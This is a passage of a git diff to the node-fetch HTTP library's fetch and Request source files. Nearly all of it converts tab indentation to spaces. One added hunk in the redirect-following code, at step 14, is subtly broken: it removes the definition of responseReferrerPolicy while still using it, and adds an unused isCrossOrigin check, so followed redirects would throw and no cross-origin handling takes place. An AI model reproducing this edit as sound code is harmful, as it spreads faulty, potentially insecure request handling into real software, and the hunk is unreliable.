\"${parsedURL.protocol.replace(/:$/, '')}\" is not supported.`);\n-\t\t}\n-\n-\t\tif (parsedURL.protocol === 'data:') {\n-\t\t\tconst data = dataUriToBuffer(request.url);\n-\t\t\tconst response = new Response(data, {headers: {'Content-Type': data.typeFull}});\n-\t\t\tresolve(response);\n-\t\t\treturn;\n-\t\t}\n-\n-\t\t// Wrap http.request into fetch\n-\t\tconst send = (parsedURL.protocol === 'https:' ? https : http).request;\n-\t\tconst {signal} = request;\n-\t\tlet response = null;\n-\n-\t\tconst abort = () => {\n-\t\t\tconst error = new AbortError('The operation was aborted.');\n-\t\t\treject(error);\n-\t\t\tif (request.body && request.body instanceof Stream.Readable) {\n-\t\t\t\trequest.body.destroy(error);\n-\t\t\t}\n-\n-\t\t\tif (!response || !response.body) {\n-\t\t\t\treturn;\n-\t\t\t}\n-\n-\t\t\tresponse.body.emit('error', error);\n-\t\t};\n-\n-\t\tif (signal && signal.aborted) {\n-\t\t\tabort();\n-\t\t\treturn;\n-\t\t}\n-\n-\t\tconst abortAndFinalize = () => {\n-\t\t\tabort();\n-\t\t\tfinalize();\n-\t\t};\n-\n-\t\t// Send request\n-\t\tconst request_ = send(parsedURL.toString(), options);\n-\n-\t\tif (signal) {\n-\t\t\tsignal.addEventListener('abort', abortAndFinalize);\n-\t\t}\n-\n-\t\tconst finalize = () => {\n-\t\t\trequest_.abort();\n-\t\t\tif (signal) {\n-\t\t\t\tsignal.removeEventListener('abort', abortAndFinalize);\n-\t\t\t}\n-\t\t};\n-\n-\t\trequest_.on('error', error => {\n-\t\t\treject(new FetchError(`request to ${request.url} failed, reason: ${error.message}`, 'system', error));\n-\t\t\tfinalize();\n-\t\t});\n-\n-\t\tfixResponseChunkedTransferBadEnding(request_, error => {\n-\t\t\tresponse.body.destroy(error);\n-\t\t});\n-\n-\t\t/* c8 ignore next 18 */\n-\t\tif (process.version < 'v14') {\n-\t\t\t// Before Node.js 14, pipeline() does not fully support async iterators and does not always\n-\t\t\t// properly handle when the socket close/end events are out of order.\n-\t\t\trequest_.on('socket', s => {\n-\t\t\t\tlet endedWithEventsCount;\n-\t\t\t\ts.prependListener('end', () => {\n-\t\t\t\t\tendedWithEventsCount = s._eventsCount;\n-\t\t\t\t});\n-\t\t\t\ts.prependListener('close', hadError => {\n-\t\t\t\t\t// if end happened before close but the socket didn't emit an error, do it now\n-\t\t\t\t\tif (response && endedWithEventsCount < s._eventsCount && !hadError) {\n-\t\t\t\t\t\tconst error = new Error('Premature close');\n-\t\t\t\t\t\terror.code = 'ERR_STREAM_PREMATURE_CLOSE';\n-\t\t\t\t\t\tresponse.body.emit('error', error);\n-\t\t\t\t\t}\n-\t\t\t\t});\n-\t\t\t});\n-\t\t}\n-\n-\t\trequest_.on('response', response_ => {\n-\t\t\trequest_.setTimeout(0);\n-\t\t\tconst headers = fromRawHeaders(response_.rawHeaders);\n-\n-\t\t\t// HTTP fetch step 5\n-\t\t\tif (isRedirect(response_.statusCode)) {\n-\t\t\t\t// HTTP fetch step 5.2\n-\t\t\t\tconst location = headers.get('Location');\n-\n-\t\t\t\t// HTTP fetch step 5.3\n-\t\t\t\tlet locationURL = null;\n-\t\t\t\ttry {\n-\t\t\t\t\tlocationURL = location === null ? null : new URL(location, request.url);\n-\t\t\t\t} catch {\n-\t\t\t\t\t// error here can only be invalid URL in Location: header\n-\t\t\t\t\t// do not throw when options.redirect == manual\n-\t\t\t\t\t// let the user extract the errorneous redirect URL\n-\t\t\t\t\tif (request.redirect !== 'manual') {\n-\t\t\t\t\t\treject(new FetchError(`uri requested responds with an invalid redirect URL: ${location}`, 'invalid-redirect'));\n-\t\t\t\t\t\tfinalize();\n-\t\t\t\t\t\treturn;\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\n-\t\t\t\t// HTTP fetch step 5.5\n-\t\t\t\tswitch (request.redirect) {\n-\t\t\t\t\tcase 'error':\n-\t\t\t\t\t\treject(new FetchError(`uri requested responds with a redirect, redirect mode is set to error: ${request.url}`, 'no-redirect'));\n-\t\t\t\t\t\tfinalize();\n-\t\t\t\t\t\treturn;\n-\t\t\t\t\tcase 'manual':\n-\t\t\t\t\t\t// Node-fetch-specific step: make manual redirect a bit easier to use by setting the Location header value to the resolved URL.\n-\t\t\t\t\t\tif (locationURL !== null) {\n-\t\t\t\t\t\t\theaders.set('Location', locationURL);\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\tbreak;\n-\t\t\t\t\tcase 'follow': {\n-\t\t\t\t\t\t// HTTP-redirect fetch step 2\n-\t\t\t\t\t\tif (locationURL === null) {\n-\t\t\t\t\t\t\tbreak;\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 5\n-\t\t\t\t\t\tif (request.counter >= request.follow) {\n-\t\t\t\t\t\t\treject(new FetchError(`maximum redirect reached at: ${request.url}`, 'max-redirect'));\n-\t\t\t\t\t\t\tfinalize();\n-\t\t\t\t\t\t\treturn;\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 6 (counter increment)\n-\t\t\t\t\t\t// Create a new Request object.\n-\t\t\t\t\t\tconst requestOptions = {\n-\t\t\t\t\t\t\theaders: new Headers(request.headers),\n-\t\t\t\t\t\t\tfollow: request.follow,\n-\t\t\t\t\t\t\tcounter: request.counter + 1,\n-\t\t\t\t\t\t\tagent: request.agent,\n-\t\t\t\t\t\t\tcompress: request.compress,\n-\t\t\t\t\t\t\tmethod: request.method,\n-\t\t\t\t\t\t\tbody: clone(request),\n-\t\t\t\t\t\t\tsignal: request.signal,\n-\t\t\t\t\t\t\tsize: request.size,\n-\t\t\t\t\t\t\treferrer: request.referrer,\n-\t\t\t\t\t\t\treferrerPolicy: request.referrerPolicy\n-\t\t\t\t\t\t};\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 9\n-\t\t\t\t\t\tif (response_.statusCode !== 303 && request.body && options_.body instanceof Stream.Readable) {\n-\t\t\t\t\t\t\treject(new FetchError('Cannot follow redirect with body being a readable stream', 'unsupported-redirect'));\n-\t\t\t\t\t\t\tfinalize();\n-\t\t\t\t\t\t\treturn;\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 11\n-\t\t\t\t\t\tif (response_.statusCode === 303 || ((response_.statusCode === 301 || response_.statusCode === 302) && request.method === 'POST')) {\n-\t\t\t\t\t\t\trequestOptions.method = 'GET';\n-\t\t\t\t\t\t\trequestOptions.body = undefined;\n-\t\t\t\t\t\t\trequestOptions.headers.delete('content-length');\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 14\n-\t\t\t\t\t\tconst responseReferrerPolicy = parseReferrerPolicyFromHeader(headers);\n-\t\t\t\t\t\tif (responseReferrerPolicy) {\n-\t\t\t\t\t\t\trequestOptions.referrerPolicy = responseReferrerPolicy;\n-\t\t\t\t\t\t}\n-\n-\t\t\t\t\t\t// HTTP-redirect fetch step 15\n-\t\t\t\t\t\tresolve(fetch(new Request(locationURL, requestOptions)));\n-\t\t\t\t\t\tfinalize();\n-\t\t\t\t\t\treturn;\n-\t\t\t\t\t}\n-\n-\t\t\t\t\tdefault:\n-\t\t\t\t\t\treturn reject(new TypeError(`Redirect option '${request.redirect}' is not a valid value of RequestRedirect`));\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\t// Prepare response\n-\t\t\tif (signal) {\n-\t\t\t\tresponse_.once('end', () => {\n-\t\t\t\t\tsignal.removeEventListener('abort', abortAndFinalize);\n-\t\t\t\t});\n-\t\t\t}\n-\n-\t\t\tlet body = pump(response_, new PassThrough(), reject);\n-\t\t\t// see https://github.com/nodejs/node/pull/29376\n-\t\t\tif (process.version < 'v12.10') {\n-\t\t\t\tresponse_.on('aborted', abortAndFinalize);\n-\t\t\t}\n-\n-\t\t\tconst responseOptions = {\n-\t\t\t\turl: request.url,\n-\t\t\t\tstatus: response_.statusCode,\n-\t\t\t\tstatusText: response_.statusMessage,\n-\t\t\t\theaders,\n-\t\t\t\tsize: request.size,\n-\t\t\t\tcounter: request.counter,\n-\t\t\t\thighWaterMark: request.highWaterMark\n-\t\t\t};\n-\n-\t\t\t// HTTP-network fetch step 12.1.1.3\n-\t\t\tconst codings = headers.get('Content-Encoding');\n-\n-\t\t\t// HTTP-network fetch step 12.1.1.4: handle content codings\n-\n-\t\t\t// in following scenarios we ignore compression support\n-\t\t\t// 1. compression support is disabled\n-\t\t\t// 2. HEAD request\n-\t\t\t// 3. no Content-Encoding header\n-\t\t\t// 4. no content response (204)\n-\t\t\t// 5. content not modified response (304)\n-\t\t\tif (!request.compress || request.method === 'HEAD' || codings === null || response_.statusCode === 204 || response_.statusCode === 304) {\n-\t\t\t\tresponse = new Response(body, responseOptions);\n-\t\t\t\tresolve(response);\n-\t\t\t\treturn;\n-\t\t\t}\n-\n-\t\t\t// For Node v6+\n-\t\t\t// Be less strict when decoding compressed responses, since sometimes\n-\t\t\t// servers send slightly invalid responses that are still accepted\n-\t\t\t// by common browsers.\n-\t\t\t// Always using Z_SYNC_FLUSH is what cURL does.\n-\t\t\tconst zlibOptions = {\n-\t\t\t\tflush: zlib.Z_SYNC_FLUSH,\n-\t\t\t\tfinishFlush: zlib.Z_SYNC_FLUSH\n-\t\t\t};\n-\n-\t\t\t// For gzip\n-\t\t\tif (codings === 'gzip' || codings === 'x-gzip') {\n-\t\t\t\tbody = pump(body, zlib.createGunzip(zlibOptions), reject);\n-\t\t\t\tresponse = new Response(body, responseOptions);\n-\t\t\t\tresolve(response);\n-\t\t\t\treturn;\n-\t\t\t}\n-\n-\t\t\t// For deflate\n-\t\t\tif (codings === 'deflate' || codings === 'x-deflate') {\n-\t\t\t\t// Handle the infamous raw deflate response from old servers\n-\t\t\t\t// a hack for old IIS and Apache servers\n-\t\t\t\tconst raw = pump(response_, new PassThrough(), reject);\n-\t\t\t\traw.once('data', chunk => {\n-\t\t\t\t\t// See http://stackoverflow.com/questions/37519828\n-\t\t\t\t\tbody = (chunk[0] & 0x0F) === 0x08 ? pump(body, zlib.createInflate(), reject) : pump(body, zlib.createInflateRaw(), reject);\n-\n-\t\t\t\t\tresponse = new Response(body, responseOptions);\n-\t\t\t\t\tresolve(response);\n-\t\t\t\t});\n-\t\t\t\treturn;\n-\t\t\t}\n-\n-\t\t\t// For br\n-\t\t\tif (codings === 'br') {\n-\t\t\t\tbody = pump(body, zlib.createBrotliDecompress(), reject);\n-\t\t\t\tresponse = new Response(body, responseOptions);\n-\t\t\t\tresolve(response);\n-\t\t\t\treturn;\n-\t\t\t}\n-\n-\t\t\t// Otherwise, use response as-is\n-\t\t\tresponse = new Response(body, responseOptions);\n-\t\t\tresolve(response);\n-\t\t});\n-\n-\t\t// eslint-disable-next-line promise/prefer-await-to-then\n-\t\twriteToStream(request_, request).catch(reject);\n-\t});\n+        return new Promise((resolve, reject) => {\n+                // Build request object\n+                const request = new Request(url, options_);\n+                const {parsedURL, options} = getNodeRequestOptions(request);\n+                if (!supportedSchemas.has(parsedURL.protocol)) {\n+                        throw new TypeError(`node-fetch cannot load ${url}. URL scheme \"${parsedURL.protocol.replace(/:$/, '')}\" is not supported.`);\n+                }\n+\n+                if (parsedURL.protocol === 'data:') {\n+                        const data = dataUriToBuffer(request.url);\n+                        const response = new Response(data, {headers: {'Content-Type': data.typeFull}});\n+                        resolve(response);\n+                        return;\n+                }\n+\n+                // Wrap http.request into fetch\n+                const send = (parsedURL.protocol === 'https:' ? https : http).request;\n+                const {signal} = request;\n+                let response = null;\n+\n+                const abort = () => {\n+                        const error = new AbortError('The operation was aborted.');\n+                        reject(error);\n+                        if (request.body && request.body instanceof Stream.Readable) {\n+                                request.body.destroy(error);\n+                        }\n+\n+                        if (!response || !response.body) {\n+                                return;\n+                        }\n+\n+                        response.body.emit('error', error);\n+                };\n+\n+                if (signal && signal.aborted) {\n+                        abort();\n+                        return;\n+                }\n+\n+                const abortAndFinalize = () => {\n+                        abort();\n+                        finalize();\n+                };\n+\n+                // Send request\n+                const request_ = send(parsedURL.toString(), options);\n+\n+                if (signal) {\n+                        signal.addEventListener('abort', abortAndFinalize);\n+                }\n+\n+                const finalize = () => {\n+                        request_.abort();\n+                        if (signal) {\n+                                signal.removeEventListener('abort', abortAndFinalize);\n+                        }\n+                };\n+\n+                request_.on('error', error => {\n+                        reject(new FetchError(`request to ${request.url} failed, reason: ${error.message}`, 'system', error));\n+                        finalize();\n+                });\n+\n+                fixResponseChunkedTransferBadEnding(request_, error => {\n+                        response.body.destroy(error);\n+                });\n+\n+                /* c8 ignore next 18 */\n+                if (process.version < 'v14') {\n+                        // Before Node.js 14, pipeline() does not fully support async iterators and does not always\n+                        // properly handle when the socket close/end events are out of order.\n+                        request_.on('socket', s => {\n+                                let endedWithEventsCount;\n+                                s.prependListener('end', () => {\n+                                        endedWithEventsCount = s._eventsCount;\n+                                });\n+                                s.prependListener('close', hadError => {\n+                                        // if end happened before close but the socket didn't emit an error, do it now\n+                                        if (response && endedWithEventsCount < s._eventsCount && !hadError) {\n+                                                const error = new Error('Premature close');\n+                                                error.code = 'ERR_STREAM_PREMATURE_CLOSE';\n+                                                response.body.emit('error', error);\n+                                        }\n+                                });\n+                        });\n+                }\n+\n+                request_.on('response', response_ => {\n+                        request_.setTimeout(0);\n+                        const headers = fromRawHeaders(response_.rawHeaders);\n+\n+                        // HTTP fetch step 5\n+                        if (isRedirect(response_.statusCode)) {\n+                                // HTTP fetch step 5.2\n+                                const location = headers.get('Location');\n+\n+                                // HTTP fetch step 5.3\n+                                let locationURL = null;\n+                                try {\n+                                        locationURL = location === null ? null : new URL(location, request.url);\n+                                } catch {\n+                                        // error here can only be invalid URL in Location: header\n+                                        // do not throw when options.redirect == manual\n+                                        // let the user extract the errorneous redirect URL\n+                                        if (request.redirect !== 'manual') {\n+                                                reject(new FetchError(`uri requested responds with an invalid redirect URL: ${location}`, 'invalid-redirect'));\n+                                                finalize();\n+                                                return;\n+                                        }\n+                                }\n+\n+                                // HTTP fetch step 5.5\n+                                switch (request.redirect) {\n+                                        case 'error':\n+                                                reject(new FetchError(`uri requested responds with a redirect, redirect mode is set to error: ${request.url}`, 'no-redirect'));\n+                                                finalize();\n+                                                return;\n+                                        case 'manual':\n+                                                // Node-fetch-specific step: make manual redirect a bit easier to use by setting the Location header value to the resolved URL.\n+                                                if (locationURL !== null) {\n+                                                        headers.set('Location', locationURL);\n+                                                }\n+\n+                                                break;\n+                                        case 'follow': {\n+                                                // HTTP-redirect fetch step 2\n+                                                if (locationURL === null) {\n+                                                        break;\n+                                                }\n+\n+                                                // HTTP-redirect fetch step 5\n+                                                if (request.counter >= request.follow) {\n+                                                        reject(new FetchError(`maximum redirect reached at: ${request.url}`, 'max-redirect'));\n+                                                        finalize();\n+                                                        return;\n+                                                }\n+\n+                                                // HTTP-redirect fetch step 6 (counter increment)\n+                                                // Create a new Request object.\n+                                                const requestOptions = {\n+                                                        headers: new Headers(request.headers),\n+                                                        follow: request.follow,\n+                                                        counter: request.counter + 1,\n+                                                        agent: request.agent,\n+                                                        compress: request.compress,\n+                                                        method: request.method,\n+                                                        body: clone(request),\n+                                                        signal: request.signal,\n+                                                        size: request.size,\n+                                                        referrer: request.referrer,\n+                                                        referrerPolicy: request.referrerPolicy\n+                                                };\n+\n+                                                // HTTP-redirect fetch step 9\n+                                                if (response_.statusCode !== 303 && request.body && options_.body instanceof Stream.Readable) {\n+                                                        reject(new FetchError('Cannot follow redirect with body being a readable stream', 'unsupported-redirect'));\n+                                                        finalize();\n+                                                        return;\n+                                                }\n+\n+                                                // HTTP-redirect fetch step 11\n+                                                if (response_.statusCode === 303 || ((response_.statusCode === 301 || response_.statusCode === 302) && request.method === 'POST')) {\n+                                                        requestOptions.method = 'GET';\n+                                                        requestOptions.body = undefined;\n+                                                        requestOptions.headers.delete('content-length');\n+                                                }\n+\n+                                                // HTTP-redirect fetch step 14\n+                                                const isCrossOrigin = locationURL.origin !== request.origin;\n+                                                if (responseReferrerPolicy) {\n+                                                        requestOptions.referrerPolicy = responseReferrerPolicy;\n+                                                }\n+\n+                                                // HTTP-redirect fetch step 15\n+                                                resolve(fetch(new Request(locationURL, requestOptions)));\n+                                                finalize();\n+                                                return;\n+                                        }\n+\n+                                        default:\n+                                                return reject(new TypeError(`Redirect option '${request.redirect}' is not a valid value of RequestRedirect`));\n+                                }\n+                        }\n+\n+                        // Prepare response\n+                        if (signal) {\n+                                response_.once('end', () => {\n+                                        signal.removeEventListener('abort', abortAndFinalize);\n+                                });\n+                        }\n+\n+                        let body = pump(response_, new PassThrough(), reject);\n+                        // see https://github.com/nodejs/node/pull/29376\n+                        if (process.version < 'v12.10') {\n+                                response_.on('aborted', abortAndFinalize);\n+                        }\n+\n+                        const responseOptions = {\n+                                url: request.url,\n+                                status: response_.statusCode,\n+                                statusText: response_.statusMessage,\n+                                headers,\n+                                size: request.size,\n+                                counter: request.counter,\n+                                highWaterMark: request.highWaterMark\n+                        };\n+\n+                        // HTTP-network fetch step 12.1.1.3\n+                        const codings = headers.get('Content-Encoding');\n+\n+                        // HTTP-network fetch step 12.1.1.4: handle content codings\n+\n+                        // in following scenarios we ignore compression support\n+                        // 1. compression support is disabled\n+                        // 2. HEAD request\n+                        // 3. no Content-Encoding header\n+                        // 4. no content response (204)\n+                        // 5. content not modified response (304)\n+                        if (!request.compress || request.method === 'HEAD' || codings === null || response_.statusCode === 204 || response_.statusCode === 304) {\n+                                response = new Response(body, responseOptions);\n+                                resolve(response);\n+                                return;\n+                        }\n+\n+                        // For Node v6+\n+                        // Be less strict when decoding compressed responses, since sometimes\n+                        // servers send slightly invalid responses that are still accepted\n+                        // by common browsers.\n+                        // Always using Z_SYNC_FLUSH is what cURL does.\n+                        const zlibOptions = {\n+                                flush: zlib.Z_SYNC_FLUSH,\n+                                finishFlush: zlib.Z_SYNC_FLUSH\n+                        };\n+\n+                        // For gzip\n+                        if (codings === 'gzip' || codings === 'x-gzip') {\n+                                body = pump(body, zlib.createGunzip(zlibOptions), reject);\n+                                response = new Response(body, responseOptions);\n+                                resolve(response);\n+                                return;\n+                        }\n+\n+                        // For deflate\n+                        if (codings === 'deflate' || codings === 'x-deflate') {\n+                                // Handle the infamous raw deflate response from old servers\n+                                // a hack for old IIS and Apache servers\n+                                const raw = pump(response_, new PassThrough(), reject);\n+                                raw.once('data', chunk => {\n+                                        // See http://stackoverflow.com/questions/37519828\n+                                        body = (chunk[0] & 0x0F) === 0x08 ? pump(body, zlib.createInflate(), reject) : pump(body, zlib.createInflateRaw(), reject);\n+\n+                                        response = new Response(body, responseOptions);\n+                                        resolve(response);\n+                                });\n+                                return;\n+                        }\n+\n+                        // For br\n+                        if (codings === 'br') {\n+                                body = pump(body, zlib.createBrotliDecompress(), reject);\n+                                response = new Response(body, responseOptions);\n+                                resolve(response);\n+                                return;\n+                        }\n+\n+                        // Otherwise, use response as-is\n+                        response = new Response(body, responseOptions);\n+                        resolve(response);\n+                });\n+\n+                // eslint-disable-next-line promise/prefer-await-to-then\n+                writeToStream(request_, request).catch(reject);\n+        });\n }\n \n function fixResponseChunkedTransferBadEnding(request, errorCallback) {\n-\tconst LAST_CHUNK = Buffer.from('0\\r\\n\\r\\n');\n-\n-\tlet isChunkedTransfer = false;\n-\tlet properLastChunkReceived = false;\n-\tlet previousChunk;\n-\n-\trequest.on('response', response => {\n-\t\tconst {headers} = response;\n-\t\tisChunkedTransfer = headers['transfer-encoding'] === 'chunked' && !headers['content-length'];\n-\t});\n-\n-\trequest.on('socket', socket => {\n-\t\tconst onSocketClose = () => {\n-\t\t\tif (isChunkedTransfer && !properLastChunkReceived) {\n-\t\t\t\tconst error = new Error('Premature close');\n-\t\t\t\terror.code = 'ERR_STREAM_PREMATURE_CLOSE';\n-\t\t\t\terrorCallback(error);\n-\t\t\t}\n-\t\t};\n-\n-\t\tsocket.prependListener('close', onSocketClose);\n-\n-\t\trequest.on('abort', () => {\n-\t\t\tsocket.removeListener('close', onSocketClose);\n-\t\t});\n-\n-\t\tsocket.on('data', buf => {\n-\t\t\tproperLastChunkReceived = Buffer.compare(buf.slice(-5), LAST_CHUNK) === 0;\n-\n-\t\t\t// Sometimes final 0-length chunk and end of message code are in separate packets\n-\t\t\tif (!properLastChunkReceived && previousChunk) {\n-\t\t\t\tproperLastChunkReceived = (\n-\t\t\t\t\tBuffer.compare(previousChunk.slice(-3), LAST_CHUNK.slice(0, 3)) === 0 &&\n-\t\t\t\t\tBuffer.compare(buf.slice(-2), LAST_CHUNK.slice(3)) === 0\n-\t\t\t\t);\n-\t\t\t}\n-\n-\t\t\tpreviousChunk = buf;\n-\t\t});\n-\t});\n+        const LAST_CHUNK = Buffer.from('0\\r\\n\\r\\n');\n+\n+        let isChunkedTransfer = false;\n+        let properLastChunkReceived = false;\n+        let previousChunk;\n+\n+        request.on('response', response => {\n+                const {headers} = response;\n+                isChunkedTransfer = headers['transfer-encoding'] === 'chunked' && !headers['content-length'];\n+        });\n+\n+        request.on('socket', socket => {\n+                const onSocketClose = () => {\n+                        if (isChunkedTransfer && !properLastChunkReceived) {\n+                                const error = new Error('Premature close');\n+                                error.code = 'ERR_STREAM_PREMATURE_CLOSE';\n+                                errorCallback(error);\n+                        }\n+                };\n+\n+                socket.prependListener('close', onSocketClose);\n+\n+                request.on('abort', () => {\n+                        socket.removeListener('close', onSocketClose);\n+                });\n+\n+                socket.on('data', buf => {\n+                        properLastChunkReceived = Buffer.compare(buf.slice(-5), LAST_CHUNK) === 0;\n+\n+                        // Sometimes final 0-length chunk and end of message code are in separate packets\n+                        if (!properLastChunkReceived && previousChunk) {\n+                                properLastChunkReceived = (\n+                                        Buffer.compare(previousChunk.slice(-3), LAST_CHUNK.slice(0, 3)) === 0 &&\n+                                        Buffer.compare(buf.slice(-2), LAST_CHUNK.slice(3)) === 0\n+                                );\n+                        }\n+\n+                        previousChunk = buf;\n+                });\n+        });\n }\ndiff --git a/src/request.js b/src/request.js\nindex 76d7576..ad8ca8e 100644\n--- a/src/request.js\n+++ b/src/request.js\n@@ -13,7 +13,7 @@ import Body, {clone, extractContentType, getTotalBytes} from './body.js';\n import {isAbortSignal} from './utils/is.js';\n import {getSearch} from './utils/get-search.js';\n import {\n-\tvalidateReferrerPolicy, determineRequestsReferrer, DEFAULT_REFERRER_POLICY\n+        validateReferrerPolicy, determineRequestsReferrer, DEFAULT_REFERRER_POLICY\n } from './utils/referrer.js';\n \n const INTERNALS = Symbol('Request internals');\n@@ -25,15 +25,15 @@ const INTERNALS = Symbol('Request internals');\n  * @return {boolean}\n  */\n const isRequest = object => {\n-\treturn (\n-\t\ttypeof object === 'object' &&\n-\t\ttypeof object[INTERNALS] === 'object'\n-\t);\n+        return (\n+                typeof object === 'object' &&\n+                typeof object[INTERNALS] === 'object'\n+        );\n };\n \n const doBadDataWarn = deprecate(() => {},\n-\t'.data is not a valid RequestInit property, use .body instead',\n-\t'https://github.com/node-fetch/node-fetch/issues/1000 (request)');\n+        '.data is not a valid RequestInit property, use .body instead',\n+        'https://github.com/node-fetch/node-fetch/issues/1000 (request)');\n \n /**\n  * Request class\n@@ -45,174 +45,257 @@ const doBadDataWarn = deprecate(() => {},\n  * @return  Void\n  */\n export default class Request extends Body {\n-\tconstructor(input, init = {}) {\n-\t\tlet parsedURL;\n-\n-\t\t// Normalize input and force URL to be encoded as UTF-8 (https://github.com/node-fetch/node-fetch/issues/245)\n-\t\tif (isRequest(input)) {\n-\t\t\tparsedURL = new URL(input.url);\n-\t\t} else {\n-\t\t\tparsedURL = new URL(input);\n-\t\t\tinput = {};\n-\t\t}\n-\n-\t\tif (parsedURL.username !== '' || parsedURL.password !== '') {\n-\t\t\tthrow new TypeError(`${parsedURL} is an url with embedded credentails.`);\n-\t\t}\n-\n-\t\tlet method = init.method || input.method || 'GET';\n-\t\tmethod = method.toUpperCase();\n-\n-\t\tif ('data' in init) {\n-\t\t\tdoBadDataWarn();\n-\t\t}\n-\n-\t\t// eslint-disable-next-line no-eq-null, eqeqeq\n-\t\tif ((init.body != null || (isRequest(input) && input.body !== null)) &&\n-\t\t\t(method === 'GET' || method === 'HEAD')) {\n-\t\t\tthrow new TypeError('Request with GET/HEAD method cannot have body');\n-\t\t}\n-\n-\t\tconst inputBody = init.body ?\n-\t\t\tinit.body :\n-\t\t\t(isRequest(input) && input.body !== null ?\n-\t\t\t\tclone(input) :\n-\t\t\t\tnull);\n-\n-\t\tsuper(inputBody, {\n-\t\t\tsize: init.size || input.size || 0\n-\t\t});\n-\n-\t\tconst headers = new Headers(init.headers || input.headers || {});\n-\n-\t\tif (inputBody !== null && !headers.has('Content-Type')) {\n-\t\t\tconst contentType = extractContentType(inputBody, this);\n-\t\t\tif (contentType) {\n-\t\t\t\theaders.set('Content-Type', contentType);\n-\t\t\t}\n-\t\t}\n-\n-\t\tlet signal = isRequest(input) ?\n-\t\t\tinput.signal :\n-\t\t\tnull;\n-\t\tif ('signal' in init) {\n-\t\t\tsignal = init.signal;\n-\t\t}\n-\n-\t\t// eslint-disable-next-line no-eq-null, eqeqeq\n-\t\tif (signal != null && !isAbortSignal(signal)) {\n-\t\t\tthrow new TypeError('Expected signal to be an instanceof AbortSignal or EventTarget');\n-\t\t}\n-\n-\t\t// \u00a75.4, Request constructor steps, step 15.1\n-\t\t// eslint-disable-next-line no-eq-null, eqeqeq\n-\t\tlet referrer = init.referrer == null ? input.referrer : init.referrer;\n-\t\tif (referrer === '') {\n-\t\t\t// \u00a75.4, Request constructor steps, step 15.2\n-\t\t\treferrer = 'no-referrer';\n-\t\t} else if (referrer) {\n-\t\t\t// \u00a75.4, Request constructor steps, step 15.3.1, 15.3.2\n-\t\t\tconst parsedReferrer = new URL(referrer);\n-\t\t\t// \u00a75.4, Request constructor steps, step 15.3.3, 15.3.4\n-\t\t\treferrer = /^about:(\\/\\/)?client$/.test(parsedReferrer) ? 'client' : parsedReferrer;\n-\t\t} else {\n-\t\t\treferrer = undefined;\n-\t\t}\n-\n-\t\tthis[INTERNALS] = {\n-\t\t\tmethod,\n-\t\t\tredirect: init.redirect || input.redirect || 'follow',\n-\t\t\theaders,\n-\t\t\tparsedURL,\n-\t\t\tsignal,\n-\t\t\treferrer\n-\t\t};\n-\n-\t\t// Node-fetch-only options\n-\t\tthis.follow = init.follow === undefined ? (input.follow === undefined ? 20 : input.follow) : init.follow;\n-\t\tthis.compress = init.compress === undefined ? (input.compress === undefined ? true : input.compress) : init.compress;\n-\t\tthis.counter = init.counter || input.counter || 0;\n-\t\tthis.agent = init.agent || input.agent;\n-\t\tthis.highWaterMark = init.highWaterMark || input.highWaterMark || 16384;\n-\t\tthis.insecureHTTPParser = init.insecureHTTPParser || input.insecureHTTPParser || false;\n-\n-\t\t// \u00a75.4, Request constructor steps, step 16.\n-\t\t// Default is empty string per https://fetch.spec.whatwg.org/#concept-request-referrer-policy\n-\t\tthis.referrerPolicy = init.referrerPolicy || input.referrerPolicy || '';\n-\t}\n-\n-\t/** @returns {string} */\n-\tget method() {\n-\t\treturn this[INTERNALS].method;\n-\t}\n-\n-\t/** @returns {string} */\n-\tget url() {\n-\t\treturn formatUrl(this[INTERNALS].parsedURL);\n-\t}\n-\n-\t/** @returns {Headers} */\n-\tget headers() {\n-\t\treturn this[INTERNALS].headers;\n-\t}\n-\n-\tget redirect() {\n-\t\treturn this[INTERNALS].redirect;\n-\t}\n-\n-\t/** @returns {AbortSignal} */\n-\tget signal() {\n-\t\treturn this[INTERNALS].signal;\n-\t}\n-\n-\t// https://fetch.spec.whatwg.org/#dom-request-referrer\n-\tget referrer() {\n-\t\tif (this[INTERNALS].referrer === 'no-referrer') {\n-\t\t\treturn '';\n-\t\t}\n-\n-\t\tif (this[INTERNALS].referrer === 'client') {\n-\t\t\treturn 'about:client';\n-\t\t}\n-\n-\t\tif (this[INTERNALS].referrer) {\n-\t\t\treturn this[INTERNALS].referrer.toString();\n-\t\t}\n-\n-\t\treturn undefined;\n-\t}\n-\n-\tget referrerPolicy() {\n-\t\treturn this[INTERNALS].referrerPolicy;\n-\t}\n-\n-\tset referrerPolicy(referrerPolicy) {\n-\t\tthis[INTERNALS].referrerPolicy = validateReferrerPolicy(referrerPolicy);\n-\t}\n-\n-\t/**\n-\t * Clone this request\n-\t *\n-\t * @return  Request\n-\t */\n-\tclone() {\n-\t\treturn new Request(this);\n-\t}\n-\n-\tget [Symbol.toStringTag]() {\n-\t\treturn 'Request';\n-\t}\n+        constructor(input, init = {}) {\n+                let parsedURL;\n+\n+                // Normalize input and force URL to be encoded as UTF-8 (https://github.com/node-fetch/node-fetch/issues/245)\n+                if (isRequest(input)) {\n+                        parsedURL = new URL(input.url);\n+                } else {\n+                        parsedURL = new URL(input);\n+                        input = {};\n+                }\n+\n+                if (parsedURL.username !== '' || parsedURL.password !== '') {\n+                        throw new TypeError(`${parsedURL} is an url with embedded credentails.`);\n+                }\n+\n+                let method = init.method || input.method || 'GET';\n+                method = method.toUpperCase();\n+\n+                if ('data' in init) {\n+                        doBadDataWarn();\n+                }\n+\n+                // eslint-disable-next-line no-eq-null, eqeqeq\n+                if ((init.body != null || (isRequest(input) && input.body !== null)) &&\n+                        (method === 'GET' || method === 'HEAD')) {\n+                        throw new TypeError('Request with GET/HEAD method cannot have body');\n+                }\n+\n+                const inputBody = init.body ?\n+                        init.body :\n+                        (isRequest(input) && input.body !== null ?\n+                                clone(input) :\n+                                null);\n+\n+                super(inputBody, {\n+                        size: init.size || input.size || 0\n+                });\n+\n+                const headers = new Headers(init.headers || input.headers || {});\n+\n+                if (inputBody !== null && !headers.has('Content-Type')) {\n+                        const contentType = extractContentType(inputBody, this);\n+                        if (contentType) 